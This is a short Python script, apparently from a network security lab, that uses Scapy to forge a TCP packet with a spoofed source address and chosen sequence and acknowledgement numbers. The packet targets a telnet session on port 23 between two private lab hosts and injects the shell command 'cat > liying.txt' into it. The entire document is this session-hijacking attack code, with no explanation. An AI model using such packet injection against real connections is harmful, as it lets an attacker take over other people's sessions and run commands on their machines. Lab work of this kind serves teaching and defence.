#!/usr/bin/python

from scapy.all import *

ip = IP(src="10.0.2.128", dst="10.0.2.129")
tcp = TCP(sport=48146, dport=23, flags="A", seq=3649557261, ack=466988711)
data = "cat > liying.txt\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)

